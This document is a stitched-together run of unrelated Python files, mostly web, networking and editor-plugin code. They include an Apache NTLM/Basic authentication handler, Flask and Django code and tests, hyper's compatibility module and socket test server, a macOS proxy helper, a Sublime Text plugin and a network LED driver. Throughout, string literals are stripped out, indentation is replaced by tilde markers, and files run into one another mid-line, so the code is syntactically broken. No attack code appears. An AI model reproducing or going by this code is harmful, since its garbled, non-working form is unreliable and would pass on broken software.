# Extract Authorization header, as a list (if present) \n 
auth_headers = req . headers_in . get ( , [ ] ) \n 
if not isinstance ( auth_headers , list ) : \n 
~~~ auth_headers = [ auth_headers ] \n 
\n 
# If this connection was authenticated with NTLM, quit immediately with an OK \n 
# (unless it comes from IE). \n 
~~ user = req . connection . notes . get ( , None ) \n 
if user : \n 
~~~ req . user = user \n 
# Internet Explorer sends a Type 1 authorization request with an empty \n 
# POST, even if the connection is already authenticated. \n 
\n 
# NTLM_AUTHORIZED key from connection.notes), but we still let a new \n 
# challenge-response exchange take place. \n 
# For other methods, it is acceptable to return OK immediately. \n 
if auth_headers : \n 
~~~ req . log_error ( % ( \n 
req . connection . id , req . method , req . clength , auth_headers ) , apache . APLOG_INFO ) \n 
if req . method != or req . clength > 0 : \n 
~~~ return apache . OK \n 
~~ ~~ else : \n 
~~~ return apache . OK \n 
\n 
# If there is no Authorization header it means it is the first request. \n 
# We reject it with a 401, indicating which authentication protocol we understand. \n 
~~ ~~ if not auth_headers : \n 
~~~ return handle_unauthorized ( req ) \n 
\n 
# Extract authentication data from any of the Authorization headers \n 
~~ try : \n 
~~~ for ah in auth_headers : \n 
~~~ ah_data = decode_http_authorization_header ( ah ) \n 
if ah_data : \n 
~~~ break \n 
~~ ~~ ~~ except : \n 
~~~ ah_data = False \n 
\n 
~~ if not ah_data : \n 
~~~ req . log_error ( % req . unparsed_uri , apache . APLOG_ERR ) \n 
return apache . HTTP_BAD_REQUEST \n 
\n 
~~ if ah_data [ 0 ] == : \n 
# If this connection was authenticated with Basic, verify that the \n 
# credentials match and return 200 (if they do) or 401 (if they \n 
\n 
~~~ userpwd = req . connection . notes . get ( , None ) \n 
if userpwd : \n 
~~~ if userpwd != ah_data [ 1 ] + ah_data [ 2 ] : \n 
~~~ return handle_unauthorized ( req ) \n 
~~ domain = req . get_options ( ) . get ( , req . auth_name ( ) ) \n 
set_remote_user ( req , ah_data [ 1 ] , domain ) \n 
return apache . OK \n 
# Connection was not authenticated before \n 
~~ return handle_basic ( req , ah_data [ 1 ] , ah_data [ 2 ] ) \n 
\n 
# If we get here it means that there is an Authorization header, with an \n 
# NTLM message in it. Moreover, the connection needs to be (re)authenticated. \n 
# Most likely, the NTLM message is of: \n 
# - Type 1 (and there is nothing in the cache): the client wants to \n 
#   authenticate for the first time, \n 
# - Type 3 (and there is something in the cache): the client wants to finalize \n 
#   a pending authentication request. \n 
# \n 
# However, it could still be that there is a Type 3 and nothing in the \n 
# cache (the final client message was erroneously routed to a new connection), \n 
# or that there is a Type 1 with something in the cache (the client wants to \n 
# initiate an cancel a pending authentication). \n 
\n 
~~ try : \n 
~~~ ntlm_version = ntlm_message_type ( ah_data [ 1 ] ) \n 
if ntlm_version == 1 : \n 
~~~ return handle_type1 ( req , ah_data [ 1 ] ) \n 
~~ if ntlm_version == 3 : \n 
~~~ if cache . has_key ( req . connection . id ) : \n 
~~~ return handle_type3 ( req , ah_data [ 1 ] ) \n 
~~ req . log_error ( % \n 
( req . unparsed_uri ) , apache . APLOG_INFO ) \n 
return handle_unauthorized ( req ) \n 
~~ error = \n 
~~ except Exception , e : \n 
~~~ error = str ( e ) \n 
~~ req . log_error ( % \n 
( req . unparsed_uri , error ) , apache . APLOG_ERR ) \n 
return apache . HTTP_BAD_REQUEST \n 
\n 
# coding: utf-8 \n 
~~ from celery import Celery \n 
\n 
\n 
def create_celery_app ( app ) : \n 
~~~ if app . config . get ( ) : \n 
~~~ app . celery = Celery ( __name__ , broker = app . config [ ] ) \n 
app . celery . conf . update ( app . config ) \n 
taskbase = app . celery . Task \n 
\n 
class ContextTask ( taskbase ) : \n 
~~~ abstract = True \n 
\n 
# make it within flask context \n 
def __call__ ( self , * args , ** kwargs ) : \n 
~~~ with app . app_context ( ) : \n 
~~~ return taskbase . __call__ ( self , * args , ** kwargs ) \n 
\n 
~~ ~~ ~~ app . celery . Task = ContextTask \n 
# http://werkzeug.pocoo.org/docs/0.11/test/#werkzeug.test.Client \n 
# http://flask.pocoo.org/docs/0.10/api/#test-client \n 
\n 
~~ ~~ import unittest \n 
import os \n 
import sys \n 
import json \n 
\n 
# Add app path to module path \n 
sys . path . append ( os . path . dirname ( os . path . realpath ( __file__ ) . rsplit ( , 2 ) [ 0 ] ) ) \n 
from app import create_app \n 
#from app.users.models import Users \n 
\n 
\n 
app = create_app ( ) \n 
add_data = """{\n  "data": {\n    "attributes":\n\n    {"active": "true", "role": "test string", "password": "test string", "creation_time": "2015-12-22T03:12:58.019077+00:00", "modification_time": "2015-12-22T03:12:58.019077+00:00", "email": "testing@flask.pocoo.com", "name": "test string"}\n         ,\n\n    "type": "users"\n  }\n\n}""" \n 
\n 
update_data = """{\n  "data": {\n    "attributes":\n\n        {"active": "false", "role": "test string", "password": "test string", "creation_time": "2015-12-22T03:12:58.019077+00:00", "modification_time": "2015-12-22T03:12:58.019077+00:00", "email": "testing@flask.pocoo.com", "name": "test string"},\n    "type": "users"\n  }\n\n}""" \n 
\n 
\n 
class TestUsers ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ self . app = app . test_client ( ) \n 
\n 
~~ def test_01_add ( self ) : \n 
\n 
~~~ rv = self . app . post ( , data = add_data , \n 
content_type = "application/json" ) \n 
assert rv . status_code == 201 \n 
\n 
~~ def test_02_read_update ( self ) : \n 
~~~ request = self . app . get ( ) \n 
dict = json . loads ( request . data . decode ( ) ) \n 
id = dict [ ] [ 0 ] [ ] \n 
rv = self . app . patch ( . format ( id ) , \n 
data = update_data , content_type = "application/json" ) \n 
assert rv . status_code == 200 \n 
\n 
~~ def test_03_delete ( self ) : \n 
~~~ request = self . app . get ( ) \n 
dict = json . loads ( request . data . decode ( ) ) \n 
id = dict [ ] [ 0 ] [ ] \n 
rv = self . app . delete ( . format ( id ) ) \n 
assert rv . status_code == 204 \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
~~ from django . core . management . base import BaseCommand \n 
\n 
from chronam . core . management . commands import configure_logging \n 
from chronam . core . index import index_pages \n 
\n 
configure_logging ( "index_pages_logging.config" , "index_pages.log" ) \n 
\n 
class Command ( BaseCommand ) : \n 
\n 
~~~ def handle ( self , ** options ) : \n 
~~~ index_pages ( ) \n 
~~ ~~ import os \n 
\n 
from django . conf import settings \n 
from django . http import HttpResponse \n 
\n 
\n 
class HttpResponseServiceUnavailable ( HttpResponse ) : \n 
~~~ status_code = 503 \n 
\n 
\n 
~~ class TooBusyMiddleware ( object ) : \n 
\n 
~~~ def process_request ( self , request ) : \n 
~~~ one , five , fifteen = os . getloadavg ( ) \n 
if one > settings . TOO_BUSY_LOAD_AVERAGE : \n 
~~~ return HttpResponseServiceUnavailable ( """\n<!doctype html>\n<html>\n<head>\n  <meta charset="utf-8">\n  <title>Server Too Busy - Chronicling America - Chronicling America (The Library of Congress)</title> \n  <style></style>\n</head>\n<body>\n     <article>\n\t  <h1>Server Too Busy</h1>\n\t   <div>\n            <p>The Chronicling America server is currently too busy to serve your request. Please try your request again shortly.</p>\n            <p><a href="http://www.loc.gov/pictures/resource/ppmsc.01752/"><img src="http://lcweb2.loc.gov/service/pnp/ppmsc/01700/01752r.jpg"/></a></p>\n\t   </div>\n     </article>\n</body>\n</html>\n""" ) \n 
~~ return None \n 
~~ ~~ from os . path import dirname , join \n 
\n 
from django . test import TestCase \n 
\n 
from chronam . core . ocr_extractor import ocr_extractor \n 
\n 
\n 
class OcrExtractorTests ( TestCase ) : \n 
\n 
~~~ def test_extractor ( self ) : \n 
~~~ dir = join ( dirname ( dirname ( __file__ ) ) , ) \n 
ocr_file = join ( dir , ) \n 
text , coord_info = ocr_extractor ( ocr_file ) \n 
coords = coord_info [ "coords" ] \n 
expected_text = { "eng" : file ( join ( dir , ) ) . read ( ) . decode ( ) } \n 
\n 
self . assertEqual ( text , expected_text ) \n 
self . assertEqual ( len ( coords . keys ( ) ) , 2150 ) \n 
self . assertEqual ( len ( coords [ ] ) , 3 ) \n 
# Craft. should be normalized to Craft \n 
\n 
# trailing punctuation in highlighted text \n 
self . assertTrue ( coords . has_key ( ) ) \n 
self . assertTrue ( not coords . has_key ( ) ) \n 
#!/usr/bin/env python \n 
# -*- coding:  utf-8 -*- \n 
~~ ~~ """\nhuman_curl.debug\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nDebuggging tests for human_curl\n\n:copyright: (c) 2011 by Alexandr Lispython (alex@obout.ru).\n:license: BSD, see LICENSE for more details.\n""" \n 
\n 
import logging \n 
from . tests import * \n 
\n 
\n 
logger = logging . getLogger ( "human_curl" ) \n 
logger . setLevel ( logging . DEBUG ) \n 
\n 
# Add the log message handler to the logger \n 
# LOG_FILENAME = os.path.join(os.path.dirname(__file__), "debug.log") \n 
# handler = logging.handlers.FileHandler(LOG_FILENAME) \n 
handler = logging . StreamHandler ( ) \n 
\n 
formatter = logging . Formatter ( "%(levelname)s %(asctime)s %(module)s [%(lineno)d] %(process)d %(thread)d | %(message)s " ) \n 
\n 
handler . setFormatter ( formatter ) \n 
\n 
logger . addHandler ( handler ) \n 
import asyncio \n 
\n 
from zeroservices import ZeroMQMedium , ResourceService \n 
from zeroservices . services import get_http_interface \n 
\n 
from zeroservices . discovery import UdpDiscoveryMedium \n 
\n 
\n 
if __name__ == : \n 
~~~ loop = asyncio . get_event_loop ( ) \n 
medium = ZeroMQMedium ( loop , UdpDiscoveryMedium ) \n 
service = ResourceService ( , medium ) \n 
application = get_http_interface ( service , loop , port = 5001 , allowed_origins = "*" ) \n 
application = loop . run_until_complete ( application ) \n 
loop . run_until_complete ( service . start ( ) ) \n 
loop . run_forever ( ) \n 
# -*- coding: utf-8 -*- \n 
~~ """\n    scripts.init_webhook\n    ~~~~~~~~~~~~~~~~~~~~\n\n    A simple script to manage the webhook.\n\n    :copyright: (c) 2016 by Lujeni.\n    :license: BSD, see LICENSE for more details.\n""" \n 
import argparse \n 
import sys \n 
\n 
from trello import TrelloClient \n 
from slugify import slugify \n 
\n 
from matterllo . utils import config \n 
from matterllo . utils import logger \n 
\n 
SETTINGS = config ( ) \n 
LOGGING = logger ( ) \n 
\n 
\n 
def main ( ) : \n 
~~~ try : \n 
~~~ parser = argparse . ArgumentParser ( description = "Webhook helpers" ) \n 
parser . add_argument ( , dest = , action = , help = ) \n 
parser . add_argument ( , dest = , action = , help = ) \n 
parser . add_argument ( , dest = , action = , help = ) \n 
\n 
args = parser . parse_args ( ) \n 
if not args . cleanup and not args . update and not args . init : \n 
~~~ print parser . print_help ( ) \n 
sys . exit ( 0 ) \n 
\n 
~~ client = TrelloClient ( api_key = SETTINGS [ ] , token = SETTINGS [ ] ) \n 
trello_boards = client . list_boards ( ) \n 
\n 
boards_name = [ slugify ( b [ ] ) for b in SETTINGS . get ( , { } ) . values ( ) ] \n 
\n 
# cleanup part \n 
if args . cleanup or args . init : \n 
~~~ result = [ h . delete ( ) for h in client . list_hooks ( ) ] \n 
LOGGING . info ( . format ( len ( result ) ) ) \n 
\n 
# update / init part \n 
~~ if args . update or args . init : \n 
~~~ for board in trello_boards : \n 
~~~ board_name = slugify ( board . name ) \n 
if board_name not in boards_name : \n 
~~~ continue \n 
\n 
~~ LOGGING . info ( . format ( board_name ) ) \n 
url = SETTINGS [ ] + \n 
result = client . create_hook ( url , board . id ) \n 
LOGGING . info ( . format ( board_name , result ) ) \n 
~~ ~~ ~~ except Exception as e : \n 
~~~ LOGGING . error ( . format ( e ) ) \n 
sys . exit ( 1 ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ main ( ) \n 
# -*- coding: utf-8 -*- \n 
# flake8: noqa \n 
~~ """\nhyper/compat\n~~~~~~~~~~~~\n\nNormalizes the Python 2/3 API for internal use.\n""" \n 
from contextlib import contextmanager \n 
import sys \n 
import zlib \n 
\n 
try : \n 
~~~ from . import ssl_compat \n 
~~ except ImportError : \n 
# TODO log? \n 
~~~ ssl_compat = None \n 
\n 
~~ _ver = sys . version_info \n 
is_py2 = _ver [ 0 ] == 2 \n 
is_py2_7_9_or_later = _ver [ 0 ] >= 2 and _ver [ 1 ] >= 7 and _ver [ 2 ] >= 9 \n 
is_py3 = _ver [ 0 ] == 3 \n 
is_py3_3 = is_py3 and _ver [ 1 ] == 3 \n 
\n 
\n 
@ contextmanager \n 
def ignore_missing ( ) : \n 
~~~ try : \n 
~~~ yield \n 
~~ except ( AttributeError , NotImplementedError ) : # pragma: no cover \n 
~~~ pass \n 
\n 
~~ ~~ if is_py2 : \n 
~~~ if is_py2_7_9_or_later : \n 
~~~ import ssl \n 
~~ else : \n 
~~~ ssl = ssl_compat \n 
\n 
~~ from urllib import urlencode \n 
from urlparse import urlparse , urlsplit \n 
from itertools import imap \n 
\n 
def to_byte ( char ) : \n 
~~~ return ord ( char ) \n 
\n 
~~ def decode_hex ( b ) : \n 
~~~ return b . decode ( ) \n 
\n 
~~ def write_to_stdout ( data ) : \n 
~~~ sys . stdout . write ( data + ) \n 
sys . stdout . flush ( ) \n 
\n 
# The standard zlib.compressobj() accepts only positional arguments. \n 
~~ def zlib_compressobj ( level = 6 , method = zlib . DEFLATED , wbits = 15 , memlevel = 8 , \n 
strategy = zlib . Z_DEFAULT_STRATEGY ) : \n 
~~~ return zlib . compressobj ( level , method , wbits , memlevel , strategy ) \n 
\n 
~~ unicode = unicode \n 
bytes = str \n 
\n 
~~ elif is_py3 : \n 
~~~ from urllib . parse import urlencode , urlparse , urlsplit \n 
\n 
imap = map \n 
\n 
def to_byte ( char ) : \n 
~~~ return char \n 
\n 
~~ def decode_hex ( b ) : \n 
~~~ return bytes . fromhex ( b ) \n 
\n 
~~ def write_to_stdout ( data ) : \n 
~~~ sys . stdout . buffer . write ( data + ) \n 
sys . stdout . buffer . flush ( ) \n 
\n 
~~ zlib_compressobj = zlib . compressobj \n 
\n 
if is_py3_3 : \n 
~~~ ssl = ssl_compat \n 
~~ else : \n 
~~~ import ssl \n 
\n 
~~ unicode = str \n 
bytes = bytes \n 
# -*- coding: utf-8 -*- \n 
~~ """\ntest/server\n~~~~~~~~~~~\n\nThis module defines some testing infrastructure that is very useful for\nintegration-type testing of hyper. It works by spinning up background threads\nthat run test-defined logic while listening to a background thread.\n\nThis very-clever idea and most of its implementation are ripped off from\nAndrey Petrov\'s excellent urllib3 project. I owe him a substantial debt in\ningenuity and about a million beers. The license is available in NOTICES.\n""" \n 
\n 
import threading \n 
import socket \n 
import sys \n 
\n 
from hyper import HTTP20Connection \n 
from hyper . compat import ssl \n 
from hyper . http11 . connection import HTTP11Connection \n 
from hpack . hpack import Encoder \n 
from hpack . huffman import HuffmanEncoder \n 
from hpack . huffman_constants import ( \n 
REQUEST_CODES , REQUEST_CODES_LENGTH \n 
) \n 
from hyper . tls import NPN_PROTOCOL \n 
\n 
\n 
class SocketServerThread ( threading . Thread ) : \n 
~~~ """\n    This method stolen wholesale from shazow/urllib3 under license. See\n    NOTICES.\n\n    :param socket_handler: Callable which receives a socket argument for one\n        request.\n    :param ready_event: Event which gets set when the socket handler is\n        ready to receive requests.\n    """ \n 
def __init__ ( self , \n 
socket_handler , \n 
host = , \n 
ready_event = None , \n 
h2 = True , \n 
secure = True ) : \n 
~~~ threading . Thread . __init__ ( self ) \n 
\n 
self . socket_handler = socket_handler \n 
self . host = host \n 
self . secure = secure \n 
self . ready_event = ready_event \n 
self . daemon = True \n 
\n 
if self . secure : \n 
~~~ self . cxt = ssl . SSLContext ( ssl . PROTOCOL_SSLv23 ) \n 
if ssl . HAS_NPN and h2 : \n 
~~~ self . cxt . set_npn_protocols ( [ NPN_PROTOCOL ] ) \n 
~~ self . cxt . load_cert_chain ( certfile = , \n 
keyfile = ) \n 
\n 
~~ ~~ def _start_server ( self ) : \n 
~~~ sock = socket . socket ( ) \n 
if sys . platform != : \n 
~~~ sock . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) \n 
\n 
~~ if self . secure : \n 
~~~ sock = self . cxt . wrap_socket ( sock , server_side = True ) \n 
~~ sock . bind ( ( self . host , 0 ) ) \n 
self . port = sock . getsockname ( ) [ 1 ] \n 
\n 
# Once listen() returns, the server socket is ready \n 
sock . listen ( 1 ) \n 
\n 
if self . ready_event : \n 
~~~ self . ready_event . set ( ) \n 
\n 
~~ self . socket_handler ( sock ) \n 
sock . close ( ) \n 
\n 
~~ def _wrap_socket ( self , sock ) : \n 
~~~ raise NotImplementedError ( ) \n 
\n 
~~ def run ( self ) : \n 
~~~ self . server = self . _start_server ( ) \n 
\n 
\n 
~~ ~~ class SocketLevelTest ( object ) : \n 
~~~ """\n    A test-class that defines a few helper methods for running socket-level\n    tests.\n    """ \n 
def set_up ( self , secure = True , proxy = False ) : \n 
~~~ self . host = None \n 
self . port = None \n 
self . secure = secure if not proxy else False \n 
self . proxy = proxy \n 
self . server_thread = None \n 
\n 
~~ def _start_server ( self , socket_handler ) : \n 
~~~ """\n        Starts a background thread that runs the given socket handler.\n        """ \n 
ready_event = threading . Event ( ) \n 
self . server_thread = SocketServerThread ( \n 
socket_handler = socket_handler , \n 
ready_event = ready_event , \n 
h2 = self . h2 , \n 
secure = self . secure \n 
) \n 
self . server_thread . start ( ) \n 
ready_event . wait ( ) \n 
\n 
self . host = self . server_thread . host \n 
self . port = self . server_thread . port \n 
self . secure = self . server_thread . secure \n 
\n 
~~ def get_connection ( self ) : \n 
~~~ if self . h2 : \n 
~~~ if not self . proxy : \n 
~~~ return HTTP20Connection ( self . host , self . port , self . secure ) \n 
~~ else : \n 
~~~ return HTTP20Connection ( , secure = self . secure , \n 
proxy_host = self . host , \n 
proxy_port = self . port ) \n 
~~ ~~ else : \n 
~~~ if not self . proxy : \n 
~~~ return HTTP11Connection ( self . host , self . port , self . secure ) \n 
~~ else : \n 
~~~ return HTTP11Connection ( , secure = self . secure , \n 
proxy_host = self . host , \n 
proxy_port = self . port ) \n 
\n 
~~ ~~ ~~ def get_encoder ( self ) : \n 
~~~ """\n        Returns a HPACK encoder set up for responses.\n        """ \n 
e = Encoder ( ) \n 
e . huffman_coder = HuffmanEncoder ( REQUEST_CODES , REQUEST_CODES_LENGTH ) \n 
return e \n 
\n 
~~ def tear_down ( self ) : \n 
~~~ """\n        Tears down the testing thread.\n        """ \n 
self . server_thread . join ( 0.1 ) \n 
#!/usr/bin/env python \n 
# encoding: utf-8 \n 
~~ ~~ """\nSCPreferences.py: Simplified interaction with SystemConfiguration preferences\n\nTODO:\n* Refactor getvalue/setvalue code into generic functions for dealing with things other than proxies\n* Add get_proxy() to parallel set_proxy()\n""" \n 
\n 
import sys \n 
import os \n 
import unittest \n 
\n 
from SystemConfiguration import * \n 
\n 
class SCPreferences ( object ) : \n 
~~~ """Utility class for working with the SystemConfiguration framework""" \n 
proxy_protocols = ( , , ) # List of the supported protocols \n 
session = None \n 
\n 
def __init__ ( self ) : \n 
~~~ super ( SCPreferences , self ) . __init__ ( ) \n 
self . session = SCPreferencesCreate ( None , "set-proxy" , None ) \n 
\n 
~~ def save ( self ) : \n 
~~~ if not self . session : \n 
~~~ return \n 
~~ if not SCPreferencesCommitChanges ( self . session ) : \n 
~~~ raise RuntimeError ( "Unable to save SystemConfiguration changes" ) \n 
~~ if not SCPreferencesApplyChanges ( self . session ) : \n 
~~~ raise RuntimeError ( "Unable to apply SystemConfiguration changes" ) \n 
\n 
~~ ~~ def set_proxy ( self , enable = True , protocol = "HTTP" , server = "localhost" , port = 3128 ) : \n 
~~~ new_settings = SCPreferencesPathGetValue ( self . session , ) \n 
\n 
for interface in new_settings : \n 
~~~ new_settings [ interface ] [ ] [ "%sEnable" % protocol ] = 1 if enable else 0 \n 
if enable : \n 
~~~ new_settings [ interface ] [ ] [ % protocol ] = int ( port ) \n 
new_settings [ interface ] [ ] [ % protocol ] = server \n 
\n 
~~ ~~ SCPreferencesPathSetValue ( self . session , , new_settings ) \n 
\n 
~~ ~~ class SCPreferencesTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ raise RuntimeError ( "Thwack Chris about not writing these yet" ) \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
~~ import sublime , sublime_plugin , os , re \n 
\n 
class StyleSheetSetup : \n 
~~~ def __init__ ( self , extensions , regex , partials = None , index = None ) : \n 
~~~ if partials is None : \n 
~~~ self . partials = False \n 
~~ else : \n 
~~~ self . partials = partials \n 
\n 
~~ if index is None : \n 
~~~ self . index = False \n 
~~ else : \n 
~~~ self . index = index \n 
\n 
~~ self . extensions = extensions \n 
self . regex = regex \n 
\n 
~~ ~~ class ListStylesheetVariables ( sublime_plugin . TextCommand ) : \n 
~~~ def run ( self , edit ) : \n 
~~~ settings = sublime . load_settings ( ) \n 
\n 
handle_imports = settings . get ( "readImported" ) \n 
read_all_views = settings . get ( "readAllViews" ) \n 
\n 
# Define setups \n 
less_setup = StyleSheetSetup ( ( , ) , "(@[^\\s\\\\]]*)\\s*: *(.*);" ) \n 
sass_setup = StyleSheetSetup ( ( , ) , "^\\s*(\\$[^\\s\\\\]{}]*)\\s*: *([^;\\n]*);?" , True ) # Last argument True because using partials \n 
stylus_setup = StyleSheetSetup ( ( , ) , "^\\s*([^\\s\\\\]\\[]*) *= *([^;\\n]*)" , False , True ) \n 
sass_erb_setup = StyleSheetSetup ( ( , ) , "^\\s*(\\$[^\\s\\\\]{}]*)\\s*: <?%?=? *([^;\\n]*);? [\\%>]?" , True ) \n 
\n 
# Add all setups to the setup tuple \n 
setups = ( less_setup , sass_setup , stylus_setup , sass_erb_setup ) \n 
\n 
chosen_setup = None \n 
\n 
self . edit = edit \n 
fn = self . view . file_name ( ) . encode ( "utf_8" ) \n 
\n 
for setup in setups : \n 
~~~ for ext in setup . extensions : \n 
~~~ if fn . endswith ( ext ) : \n 
~~~ chosen_setup = setup \n 
\n 
~~ ~~ ~~ if chosen_setup == None : \n 
~~~ return \n 
\n 
# Handle imports \n 
~~ imports = [ ] \n 
imported_vars = [ ] \n 
\n 
compiled_regex = re . compile ( chosen_setup . regex , re . MULTILINE ) \n 
\n 
if handle_imports : \n 
~~~ self . view . find_all ( "@import [\\"|\\\'](.*)[\\"|\\\']" , 0 , "$1" , imports ) \n 
\n 
file_dir = os . path . dirname ( fn ) . decode ( "utf-8" ) \n 
\n 
for i , filename in enumerate ( imports ) : \n 
~~~ has_extension = False \n 
for ext in chosen_setup . extensions : \n 
~~~ if filename . endswith ( ext . decode ( "utf-8" ) ) : \n 
~~~ has_extension = True \n 
\n 
~~ ~~ if has_extension == False : \n 
# We need to try and find the right extension \n 
~~~ for ext in chosen_setup . extensions : \n 
~~~ ext = ext . decode ( "utf-8" ) \n 
if os . path . isfile ( os . path . normpath ( file_dir + + filename + ext ) ) : \n 
~~~ filename += ext \n 
break \n 
~~ if chosen_setup . partials : \n 
~~~ fn_split = os . path . split ( filename ) \n 
partial_filename = fn_split [ 0 ] + "/_" + fn_split [ 1 ] \n 
if os . path . isfile ( os . path . normpath ( file_dir + partial_filename + ext ) ) : \n 
~~~ filename = "_" + filename + ext \n 
break \n 
~~ ~~ if chosen_setup . index and os . path . isfile ( os . path . normpath ( file_dir + "/" + filename + "/index" + ext ) ) : \n 
~~~ filename += "/index" + ext \n 
~~ ~~ ~~ try : \n 
~~~ f = open ( os . path . normpath ( file_dir + + filename ) , ) \n 
contents = f . read ( ) \n 
f . close ( ) \n 
\n 
m = re . findall ( compiled_regex , contents ) \n 
imported_vars = imported_vars + m \n 
~~ except : \n 
~~~ print ( + filename ) \n 
\n 
# Convert a list of tuples to a list of lists \n 
~~ ~~ imported_vars = [ list ( item ) for item in imported_vars ] \n 
\n 
~~ self . variables = [ ] \n 
\n 
vars_from_views = [ ] \n 
\n 
if read_all_views : \n 
~~~ for view in self . view . window ( ) . views ( ) : \n 
~~~ viewfn = self . view . file_name ( ) . encode ( "utf-8" ) \n 
compatible_view = False \n 
\n 
for ext in chosen_setup . extensions : \n 
~~~ if viewfn . endswith ( ext ) : \n 
~~~ viewvars = [ ] \n 
view . find_all ( chosen_setup . regex , 0 , "$1|$2" , viewvars ) \n 
vars_from_views += viewvars \n 
break ; \n 
~~ ~~ ~~ ~~ else : \n 
~~~ self . view . find_all ( chosen_setup . regex , 0 , "$1|$2" , self . variables ) \n 
\n 
\n 
\n 
~~ self . variables += vars_from_views \n 
self . variables = list ( set ( self . variables ) ) \n 
for i , val in enumerate ( self . variables ) : \n 
~~~ self . variables [ i ] = val . split ( "|" ) \n 
~~ self . variables = imported_vars + self . variables \n 
self . variables . sort ( ) \n 
self . view . window ( ) . show_quick_panel ( self . variables , self . insert_variable , sublime . MONOSPACE_FONT ) \n 
\n 
~~ def insert_variable ( self , choice ) : \n 
~~~ if choice == - 1 : \n 
~~~ return \n 
~~ self . view . run_command ( , { : self . variables [ choice ] [ 0 ] } ) \n 
\n 
~~ ~~ class InsertText ( sublime_plugin . TextCommand ) : \n 
~~~ def run ( self , edit , string = ) : \n 
~~~ for selection in self . view . sel ( ) : \n 
~~~ self . view . insert ( edit , selection . begin ( ) , string ) \n 
~~ ~~ ~~ from driver_base import DriverBase \n 
import socket \n 
import sys \n 
import time \n 
\n 
import os \n 
os . sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ ) ) ) ) \n 
import log \n 
\n 
\n 
class CMDTYPE : \n 
~~~ SETUP_DATA = 1 # reserved for future use \n 
PIXEL_DATA = 2 \n 
BRIGHTNESS = 3 \n 
\n 
\n 
~~ class RETURN_CODES : \n 
~~~ SUCCESS = 255 # All is well \n 
ERROR = 0 # Generic error \n 
ERROR_SIZE = 1 # Data receieved does not match given command length \n 
ERROR_UNSUPPORTED = 2 # Unsupported command \n 
\n 
\n 
~~ class DriverNetwork ( DriverBase ) : \n 
~~~ """Driver for communicating with another device on the network.""" \n 
\n 
def __init__ ( self , num = 0 , width = 0 , height = 0 , host = "localhost" , port = 3142 ) : \n 
~~~ super ( DriverNetwork , self ) . __init__ ( num , width , height ) \n 
\n 
self . _host = host \n 
self . _port = port \n 
\n 
~~ def _generateHeader ( self , cmd , size ) : \n 
~~~ packet = bytearray ( ) \n 
packet . append ( cmd ) \n 
packet . append ( size & 0xFF ) \n 
packet . append ( size >> 8 ) \n 
return packet \n 
\n 
~~ def _connect ( self ) : \n 
~~~ try : \n 
~~~ s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
s . connect ( ( self . _host , self . _port ) ) \n 
return s \n 
~~ except socket . gaierror : \n 
~~~ error = "Unable to connect to or resolve host: {}" . format ( \n 
self . _host ) \n 
log . error ( error ) \n 
raise IOError ( error ) \n 
\n 
# Push new data to strand \n 
~~ ~~ def update ( self , data ) : \n 
~~~ try : \n 
~~~ s = self . _connect ( ) \n 
\n 
count = self . bufByteCount \n 
packet = self . _generateHeader ( CMDTYPE . PIXEL_DATA , count ) \n 
\n 
packet . extend ( data ) \n 
\n 
s . sendall ( packet ) \n 
\n 
resp = ord ( s . recv ( 1 ) ) \n 
\n 
s . close ( ) \n 
\n 
if resp != RETURN_CODES . SUCCESS : \n 
~~~ log . warning ( "Bytecount mismatch! %s" , resp ) \n 
\n 
~~ ~~ except Exception as e : \n 
~~~ log . exception ( e ) \n 
error = "Problem communicating with network receiver!" \n 
log . error ( error ) \n 
raise IOError ( error ) \n 
\n 
~~ ~~ def setMasterBrightness ( self , brightness ) : \n 
~~~ packet = self . _generateHeader ( CMDTYPE . BRIGHTNESS , 1 ) \n 
packet . append ( brightness ) \n 
s = self . _connect ( ) \n 
s . sendall ( packet ) \n 
resp = ord ( s . recv ( 1 ) ) \n 
if resp != RETURN_CODES . SUCCESS : \n 
~~~ return False \n 
~~ else : \n 
~~~ return True \n 
\n 
~~ ~~ ~~ MANIFEST = [ \n 
{ \n 
"id" : "network" , \n 
"class" : DriverNetwork , \n 
"type" : "driver" , \n 
"display" : "Network" , \n 
"desc" : "Sends pixel data over the network to a reciever." , \n 
"params" : [ { \n 
"id" : "num" , \n 
"label" : "# Pixels" , \n 
"type" : "int" , \n 
"default" : 0 , \n 
"min" : 0 , \n 
"help" : "Total pixels in display. May use Width AND Height instead." \n 
} , { \n 
"id" : "width" , \n 
"label" : "Width" , \n 
"type" : "int" , \n 
"default" : 0 , \n 
"min" : 0 , \n 
"help" : "Width of display. Set if using a matrix." \n 
} , { \n 
"id" : "height" , \n 
"label" : "Height" , \n 
"type" : "int" , \n 
"default" : 0 , \n 
"min" : 0 , \n 
"help" : "Height of display. Set if using a matrix." \n 
} , { \n 
"id" : "host" , \n 
"label" : "Pixel Size" , \n 
"type" : "str" , \n 
"default" : "localhost" , \n 
"help" : "Receiver host to connect to." \n 
} , { \n 
"id" : "port" , \n 
"label" : "Port" , \n 
"type" : "int" , \n 
"default" : 3142 , \n 
"help" : "Port to connect to." \n 
} ] \n 
} \n 
] \n 
# Copyright (c) 2011 AOL Inc.  All Rights Reserved. \n 
# \n 
# Permission is hereby granted, free of charge, to any person \n 
# obtaining a copy of this software and associated documentation files \n 
# (the "Software"), to deal in the Software without restriction, \n 
# including without limitation the rights to use, copy, modify, merge, \n 
# publish, distribute, sublicense, and/or sell copies of the Software, \n 
# and to permit persons to whom the Software is furnished to do so, \n 
# subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be \n 
# included in all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, \n 
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF \n 
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND \n 
# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS \n 
